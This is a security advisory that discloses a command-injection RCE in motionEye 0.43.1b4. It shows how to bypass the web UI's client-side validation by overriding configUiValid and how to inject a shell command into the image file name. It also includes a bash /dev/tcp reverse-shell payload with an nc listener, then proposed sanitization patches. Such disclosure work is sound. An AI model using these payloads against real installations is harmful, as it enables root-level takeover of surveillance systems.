# RCE in motioneye <= 0.43.1b4
MotionEye RCE via Client-Side Validation Bypass through config parameter:  motionEye is an online interface for the software motion, a popular video surveillance program with motion detection. (https://github.com/motioneye-project/motioneye)

## Summary
During security testing of a MotionEye instance running in Docker, it was observed that client-side validation within the web UI can be bypassed. This allows arbitrary input to be submitted, including payloads that can trigger execution on the host container. The issue poses a risk of remote code execution (RCE) if exploited.

---

## Environment
- Target: MotionEye running in Docker  
- Image: `ghcr.io/motioneye-project/motioneye:edge`  
- Exposed Port: `9999` mapped to container’s `8765`  
- Test Credentials: `admin` / blank password (default)  

---

## Steps to Reproduce

### 1. Container Setup
```bash
docker run -d --name motioneye -p 9999:8765 ghcr.io/motioneye-project/motioneye:edge
```
<img width="746" height="241" alt="image" src="https://github.com/user-attachments/assets/5e4a3e30-112d-408e-94fb-52978d60703e" />



### 2. Version Verification
```bash
docker logs motioneye | grep "motionEye server"
```
**Result:** MotionEye server `0.43.1b4`
<img width="741" height="168" alt="image" src="https://github.com/user-attachments/assets/3d25a55e-3a25-4c6f-9f93-f096baa5bee5" />



### 3. File System Access
```bash
docker exec -it motioneye /bin/bash
ls -la /tmp
```
<img width="452" height="128" alt="image" src="https://github.com/user-attachments/assets/38528db4-f497-4b7b-a444-44f8ffc39eee" />



### 4. Initial Access
Access web interface at:  
http://127.0.0.1:9999  
Login: `admin` (blank password)

### 5. Camera Setup
Added sample RTSP network camera.  
<img width="1623" height="869" alt="image" src="https://github.com/user-attachments/assets/e16a5697-c4e0-4820-9f48-417c7a76752f" />



### 6. Injection Attempt
```bash
$(touch /tmp/test).%Y-%m-%d-%H-%M-%S
```
Blocked by client-side validation.

<img width="739" height="104" alt="image" src="https://github.com/user-attachments/assets/8f63106c-e96c-4c4b-ac5d-81f9238ec341" />


<img width="611" height="90" alt="image" src="https://github.com/user-attachments/assets/2f4fbad0-22fb-40cf-bf90-1c3cba00cd46" />




### 7. Client-Side Validation Discovery
File: `/static/js/main.js?v=0.43.1b4` referencing `/static/js/ui.js?v=0.43.1b4`  
```javascript
function configUiValid() {
    $('div.settings').find('.validator').each(function () { this.validate(); });
    var valid = true;
    $('div.settings input, select').each(function () {
        if (this.invalid) { valid = false; return false; }
    });
    return valid;
}
```

### 8. Bypass Technique
```javascript
configUiValid = function() { 
    return true; 
};
```
<img width="819" height="539" alt="image" src="https://github.com/user-attachments/assets/c9171b39-f936-4c1c-b829-1909117ba6bf" />



### 9. Payload Execution
Settings:  
- Capture mode = Interval Snapshots  
- Interval = 10  
- Image File Name:  
```bash
$(touch /tmp/test).%Y-%m-%d-%H-%M-%S
```
<img width="565" height="344" alt="image" src="https://github.com/user-attachments/assets/d443e059-e82a-49d9-939c-f16f602ab529" />


Applied → File created with **root permissions**.  

<img width="554" height="164" alt="image" src="https://github.com/user-attachments/assets/0a1fb940-460c-454f-8144-2a497ad70a0c" />



---

## Impact: Weaponizing RCE

Listener:
```bash
nc -lvnp 4444
```
<img width="303" height="110" alt="image" src="https://github.com/user-attachments/assets/4287fd00-4c2c-4ea5-816e-5609dbc9a808" />



Injected Payload:
```bash
$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/192.168.0.108/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S
```
<img width="1140" height="366" alt="image" src="https://github.com/user-attachments/assets/728d09de-9f90-4000-80a4-0b3f2e38d943" />



Result: Remote shell obtained.  


---

## Root Cause & Flow
Unsanitized input written into Motion config files:  
`Dashboard JS → ConfigHandler.set_config() → camera-1.conf → motionctl.restart() → motion parses picture_filename → executes payload`

---

## Prevention

### Sanitization Fix
File: `/usr/local/lib/python3.13/dist-packages/motioneye/config.py`
```python
def sanitize_filename(value):
    # allow only letters, numbers, %, _, -, /, .
    for ch in value:
        if not (ch.isalnum() or ch in "%-_/."):
            return "%Y-%m-%d/%H-%M-%S"  # safe fallback
    return value
```
<img width="1109" height="504" alt="image" src="https://github.com/user-attachments/assets/77270bba-8379-47b0-acb3-18227008a157" />



Apply sanitization:
```python
data['picture_filename']  = sanitize_filename(ui['image_file_name'])
data['snapshot_filename'] = sanitize_filename(ui['image_file_name'])
```
before:
<img width="1126" height="471" alt="image" src="https://github.com/user-attachments/assets/729b7cac-0b27-4e0b-885c-150018e26cc2" />

after:
<img width="974" height="471" alt="image" src="https://github.com/user-attachments/assets/a1bbb54e-d5cc-4a2e-93f9-a2a8016a1cc9" />


---

## Alternative Resolution

### Step 1: Run Docker
```bash
docker run -d --name motioneye -p 9999:8765 ghcr.io/motioneye-project/motioneye:edge
```

### Step 2: Access Container
```bash
docker exec -it motioneye /bin/bash
docker cp motioneye:/usr/local/lib/python3.13/dist-packages/motioneye/config.py ./config.py
docker cp ./Mconfig.py motioneye:/usr/local/lib/python3.13/dist-packages/motioneye/config.py
```

### Step 3: Modify Config
Original:
```python
on_event_start = [f"{meyectl.find_command('relayevent')} start %t"]
on_event_end = [f"{meyectl.find_command('relayevent')} stop %t"]
on_movie_end = [f"{meyectl.find_command('relayevent')} movie_end %t %f"]
on_picture_save = [f"{meyectl.find_command('relayevent')} picture_save %t %f"]
```

Replace with:
```python
import re

on_event_start  = [f"{meyectl.find_command('relayevent')} start '{re.sub(r'[;&|$`()<>\"\\' ]', '', '%t')}'"]
on_event_end    = [f"{meyectl.find_command('relayevent')} stop '{re.sub(r'[;&|$`()<>\"\\' ]', '', '%t')}'"]
on_movie_end    = [f"{meyectl.find_command('relayevent')} movie_end '{re.sub(r'[;&|$`()<>\"\\' ]', '', '%t')}' '{re.sub(r'[;&|$`()<>\"\\' ]', '', '%f')}'"]
on_picture_save = [f"{meyectl.find_command('relayevent')} picture_save '{re.sub(r'[;&|$`()<>\"\\' ]', '', '%t')}' '{re.sub(r'[;&|$`()<>\"\\' ]', '', '%f')}'"]
```
<img width="1060" height="116" alt="image" src="https://github.com/user-attachments/assets/db10a959-1a97-4bec-921c-3788e8b4d04c" />


### Step 4: Restart
```bash
docker restart motioneye
```
<img width="539" height="95" alt="image" src="https://github.com/user-attachments/assets/5e983b37-7d4d-4ed2-90cf-1b367a2ef477" />


---

## Alternative Patch
Inside `motion_camera_ui_to_dict(...)`:

Original:
```python
data['picture_filename'] = ui['image_file_name']
data['snapshot_filename'] = ui['image_file_name']
```

Replace with:
```python
from re import sub
data['picture_filename']  = (sub(r'[^A-Za-z0-9._%/-]', '_', ui['image_file_name']).lstrip('/') or '%Y-%m-%d/%H-%M-%S')
data['snapshot_filename'] = (sub(r'[^A-Za-z0-9._%/-]', '_', ui['image_file_name']).lstrip('/') or '%Y-%m-%d/%H-%M-%S')
```

---

## Additional Notes
- Maintainers are aware of this issue and in process of fixing as of sep 2025.
